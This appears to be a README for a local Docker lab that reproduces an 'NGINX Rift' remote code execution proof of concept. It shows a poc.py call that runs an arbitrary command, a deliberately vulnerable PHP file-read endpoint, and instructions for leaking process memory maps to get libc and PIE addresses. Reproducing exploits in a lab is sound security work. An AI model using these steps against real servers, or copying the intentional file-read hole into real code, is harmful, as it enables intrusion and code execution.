# Local Docker Lab

This lab is for reproducing the NGINX Rift PoC against the local vulnerable
container only.

## Build

```sh
docker compose -f env/docker-compose.yml build --no-cache
```

The compose file pins the service to `linux/amd64` because the PoC targets
x86_64 addresses.

## Start

```sh
docker compose -f env/docker-compose.yml up -d
curl -i http://127.0.0.1:19321/
```

Expected response body:

```text
ok
```

## Check Lab Addresses

```sh
docker compose -f env/docker-compose.yml exec -T nginx sh -c \
  'pid=$(cat /app/tmp/nginx.pid); cat /proc/$pid/personality; grep -m1 libc /proc/$pid/maps'
```

`00040000` means `setarch -R` disabled ASLR for nginx. The default
`--libc-base` in `poc.py` matches the current Docker image. If the base shown
by `/proc/$pid/maps` changes, pass it explicitly with `--libc-base 0x...`.

## Reproduce RCE

```sh
python3 poc.py --cmd 'echo rift-lab-ok > /tmp/rift_pwned'
docker compose -f env/docker-compose.yml exec -T nginx sh -c \
  'ls -la /tmp/rift_pwned; cat /tmp/rift_pwned'
```

Expected verification:

```text
rift-lab-ok
```

## PHP Local File Read Experiment

The lab also includes a separate PHP-FPM config that exposes an intentionally
vulnerable file-read endpoint and runs nginx workers as `www-data`:

```sh
docker compose -f env/docker-compose.yml -f env/docker-compose.lfi.yml up -d --force-recreate
```

```sh
curl 'http://127.0.0.1:19321/lfi.php?file=/proc/self/maps'
```

`/proc/self/maps` is PHP-FPM's process map, not nginx's. In this lab nginx
workers and PHP-FPM workers both run as `www-data` in the `nginx-lfi.conf`
mode, matching common Debian/Ubuntu deployments. That means the PHP file-read
can also read the nginx worker's maps if the worker PID is known:

```sh
docker compose -f env/docker-compose.yml exec -T nginx \
  ps -eo pid,ppid,user,group,comm,args

curl 'http://127.0.0.1:19321/lfi.php?file=/proc/<nginx-worker-pid>/maps'
```

The nginx worker map exposes the nginx PIE mapping and libc mapping needed to
calculate runtime addresses. The same PHP primitive could not read the
root-owned nginx master maps in this container.

Return to the default RCE lab config with:

```sh
docker compose -f env/docker-compose.yml up -d --force-recreate
```

## Cleanup

```sh
docker compose -f env/docker-compose.yml down
```
